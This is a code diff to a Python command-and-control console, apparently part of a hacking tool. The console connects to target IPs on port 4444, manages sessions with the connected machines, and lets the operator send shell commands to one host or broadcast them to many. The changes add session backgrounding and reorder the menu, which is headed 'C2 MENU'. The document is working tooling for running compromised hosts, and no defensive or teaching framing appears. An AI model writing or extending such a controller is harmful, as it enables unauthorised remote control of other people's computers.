@@ -3,7 +3,7 @@ import threading
 import time
 
 PORT = 4444  # Fixed port
-connections = {}  # { session_id: {'name': str, 'conn': socket.socket, 'addr': (ip, port)} }
+connections = {}  # { session_id: {'name': str, 'conn': socket.socket, 'addr': (ip, port), 'interacted': bool, 'backgrounded': bool} }
 session_counter = 1
 lock = threading.Lock()
 
@@ -12,13 +12,19 @@ def add_connection():
     name = input("Enter connection name: ")
     ip = input("Enter target IP: ")
     print(f"[*] Trying to connect to {ip}:{PORT}...")
-    
+
     try:
         s = socket.socket()
         s.connect((ip, PORT))
-        
+
         with lock:
-            connections[session_counter] = {'name': name, 'conn': s, 'addr': (ip, PORT)}
+            connections[session_counter] = {
+                'name': name,
+                'conn': s,
+                'addr': (ip, PORT),
+                'interacted': False,
+                'backgrounded': False
+            }
             print(f"[+] Connection '{name}' added as session {session_counter}")
             session_counter += 1
         time.sleep(1)
@@ -31,15 +37,26 @@ def show_connections():
         print("[!] No active connections.")
         time.sleep(1)
         return
-    print("\nActive Connections:")
+    print("\nAll Connections:")
     for sid, info in connections.items():
         print(f"  [{sid}] {info['name']} @ {info['addr'][0]}:{info['addr'][1]}")
+    time.sleep(1)
+
+def show_sessions():
+    print("\nBackgrounded Sessions:")
+    found = False
+    for sid, info in connections.items():
+        if info.get('backgrounded'):
+            print(f"  [{sid}] {info['name']} @ {info['addr'][0]}")
+            found = True
+    if not found:
+        print("  [!] No backgrounded sessions yet.")
     time.sleep(1)
 
 def interact_session():
     sid = input("Enter session ID to interact with (or type 'session' to list, 'back' to return): ")
     if sid == "session":
-        list_sessions()
+        show_sessions()
         return
     if sid == "back":
         return
@@ -52,7 +69,10 @@ def interact_session():
         conn = connections[sid]['conn']
         name = connections[sid]['name']
         print(f"[~] Connected to '{name}' (session {sid})\nType 'exit' to terminate, 'bg' to background.")
-        
+
+        connections[sid]['interacted'] = True
+        connections[sid]['backgrounded'] = False
+
         while True:
             cmd = input(f"{name}@session{sid}$ ")
             if cmd == "exit":
@@ -64,6 +84,7 @@ def interact_session():
                 time.sleep(1)
                 break
             elif cmd == "bg":
+                connections[sid]['backgrounded'] = True
                 print(f"[~] Session '{name}' backgrounded.")
                 time.sleep(1)
                 break
@@ -91,7 +112,7 @@ def broadcast():
     targets = []
 
     if choice == "1":
-        list_sessions()
+        show_connections()
         selected = input("Enter session IDs separated by commas (e.g. 1,3): ")
         try:
             ids = [int(x.strip()) for x in selected.split(",")]
@@ -134,21 +155,15 @@ def remove_connection():
         print("[!] Invalid input.")
     time.sleep(1)
 
-def list_sessions():
-    print("\nSessions:")
-    for sid, info in connections.items():
-        print(f"  [{sid}] {info['name']} @ {info['addr'][0]}")
-    time.sleep(1)
-
 def menu():
     while True:
         print("\n=== C2 MENU ===")
         print("1. Add Connection")
-        print("2. Show Connections")
-        print("3. Interact with Session")
-        print("4. Broadcast")
-        print("5. Remove Connection")
-        print("6. List Sessions")
+        print("2. Show All Connections")
+        print("3. Interact with Connection")
+        print("4. Show Backgrounded Sessions")
+        print("5. Broadcast Command")
+        print("6. Remove Connection")
         print("7. Exit")
 
         choice = input("Enter choice: ")
@@ -159,11 +174,11 @@ def menu():
         elif choice == "3":
             interact_session()
         elif choice == "4":
-            broadcast()
+            show_sessions()
         elif choice == "5":
-            remove_connection()
+            broadcast()
         elif choice == "6":
-            list_sessions()
+            remove_connection()
         elif choice == "7":
             print("Exiting...")
             time.sleep(1)
